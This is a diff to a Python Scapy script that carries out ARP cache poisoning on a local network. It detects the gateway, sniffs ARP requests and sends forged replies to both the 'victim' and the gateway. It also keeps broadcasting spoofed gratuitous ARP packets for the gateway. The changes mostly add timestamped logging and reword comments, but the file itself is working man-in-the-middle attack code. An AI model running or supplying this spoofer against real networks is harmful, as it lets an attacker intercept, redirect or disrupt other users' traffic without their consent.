@@ -2,9 +2,7 @@
 import os
 import time
 
-#my_ip = ARP().psrc
-#my_mac = ARP().hwsrc
-
+# send arbitray arp packet to get ip and mac of gateway
 p = srp1(Ether()/IP(dst='1.2.3.4', ttl=0)/ICMP()/'abcdefgh')
 
 gw_ip = p.payload.src
@@ -12,10 +10,13 @@ gw_mac = p.src
 my_ip = p.payload.dst
 my_mac = p.dst
 
-print('My IP:', my_ip)
-print('My MAC:', my_mac)
-print('Gateway IP:', gw_ip)
-print('Gateway Real MAC:', gw_mac)
+def log(*s):
+    print(time.asctime() + ":", *s)
+
+log('My IP:', my_ip)
+log('My MAC:', my_mac)
+log('Gateway IP:', gw_ip)
+log('Gateway Real MAC:', gw_mac)
 
 def packet_cb(p):
   p = p.payload
@@ -24,14 +25,14 @@ def packet_cb(p):
   if p.psrc == p.pdst and p.psrc == gw_ip:# Real gateway's gratuitous ARP
     do_reply(gw_ip, 'ff:ff:ff:ff:ff:ff') # gratuitous ARP
     return
-  if p.op != 1: # only who-has
+  if p.op != 1: # bypass who-has queries
     return
   if p.pdst == gw_ip:
-    print('{} at {} is requesting gateway\'s MAC...'.format(p.psrc, p.hwsrc))
-    do_reply(gw_ip, p.hwsrc, p.psrc) # reply to victim
-    do_reply(p.psrc, gw_mac, gw_ip) # hack gateway
+    log('{} at {} is requesting gateway\'s MAC...'.format(p.psrc, p.hwsrc))
+    do_reply(gw_ip, p.hwsrc, p.psrc) # spoof victim
+    do_reply(p.psrc, gw_mac, gw_ip) # spoof gateway
   elif p.psrc == gw_ip:
-    print('Gateway is requesting {}\'s MAC...'.format(p.pdst))
+    log('Gateway is requesting {}\'s MAC...'.format(p.pdst))
     do_reply(p.pdst, p.hwsrc, p.psrc) # reply to gateway
     do_reply(gw_ip, 'ff:ff:ff:ff:ff:ff') # gratuitous ARP
 
@@ -47,7 +48,7 @@ def do_reply(fake_ip, dst, pdst=''):
                        psrc=fake_ip,
                        hwdst=hwdst,
                        pdst=pdst)
-  print('new packet:')
+  log('Sending packet:')
   packet.show()
   sendp(packet * 3)
 
@@ -58,15 +59,16 @@ def main():
     do_gratuitous()
 
 def do_packet():
-  print('Doing packet')
+  log('Doing packet')
   while True:
     receive = sniff(filter='arp', count=1000, prn=packet_cb)
 
 def do_gratuitous():
-  print('Doing gratuitous')
+  log('Doing gratuitous')
   while True:
     do_reply(gw_ip, 'ff:ff:ff:ff:ff:ff') # gratuitous ARP
     time.sleep(5)
+
 
 main()
 exit()
